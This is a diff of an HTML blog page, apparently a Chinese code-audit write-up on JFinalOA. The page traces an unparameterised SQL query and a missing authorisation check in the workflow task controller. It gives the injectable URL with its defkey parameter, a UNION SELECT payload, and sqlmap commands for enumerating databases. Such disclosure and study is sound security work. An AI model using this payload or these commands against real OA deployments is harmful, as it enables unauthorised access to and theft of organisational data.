@@ -250,7 +250,7 @@
             
             <div class="markdown-body">
               <p><a target="_blank" rel="noopener" href="https://gitee.com/glorylion/JFinalOA">https://gitee.com/glorylion/JFinalOA</a></p>
-<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">src/main/java/com/pointlion/mvc/admin/oa/workflow/flowtask/FlowTaskController.java 123行<br></code></pre></td></tr></table></figure>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/pointlion/mvc/admin/oa/workflow/flowtask/FlowTaskController.java 123行<br></code></pre></div></td></tr></table></figure>
 <p>定义字符串请求参数<code>defkey</code></p>
 <p><img src="/images/43/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>随后调用<code>getHavedonePage</code>方法把前端传来的参数进行处理，结果封装到<code>Page&lt;Record&gt;</code>，查看<code>wfservice</code>是从哪里定义的接口</p>
@@ -258,7 +258,7 @@
 <p>跟进<code>WorkFlowService</code>，在该service层中搜索前面调用到的<code>getHavedonePage</code>方法，在该方法中含有一条没有进行预编译sql查询，此处直接进行数据查询导致了漏洞的产生</p>
 <p><img src="/images/43/3.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>路由配置文件路径</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">src/main/java/com/pointlion/config/routes/OARoutes.java<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/pointlion/config/routes/OARoutes.java<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/images/43/4.png" srcset="/img/loading.gif" lazyload></p>
 <p>在前面<code>FlowTaskController</code>的<code>getHaveDoneTaskDataList</code>方法中含有一个越权漏洞，此处只获取了登陆状态，没有对用户鉴权</p>
@@ -268,18 +268,18 @@
 <p>所以这个注入只需要普通用户就可以利用，这里创建一个test用户</p>
 <p><img src="/images/43/7.png" srcset="/img/loading.gif" lazyload></p>
 <p>根据该框架路由配置结合controller的方法构造url</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/admin/oa/workflow/flowtask/getHaveDoneTaskDataList?pageNumber=&amp;pageSize=&amp;defkey=<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/admin/oa/workflow/flowtask/getHaveDoneTaskDataList?pageNumber=&amp;pageSize=&amp;defkey=<br></code></pre></div></td></tr></table></figure>
 
 <p>注入payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; UNION SELECT 1,2,3 --+</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; UNION SELECT 1,2,3 --+</span><br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/images/43/8.png" srcset="/img/loading.gif" lazyload></p>
 <p>语句报错，丢sqlmap注入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap.py -r D:\test.txt --random-agent<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap.py -r D:\test.txt --random-agent<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/images/43/9.png" srcset="/img/loading.gif" lazyload></p>
 <p>跑库</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap.py -r D:\test.txt --random-agent --dbs --current-db<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap.py -r D:\test.txt --random-agent --dbs --current-db<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/images/43/10.png" srcset="/img/loading.gif" lazyload></p>
 
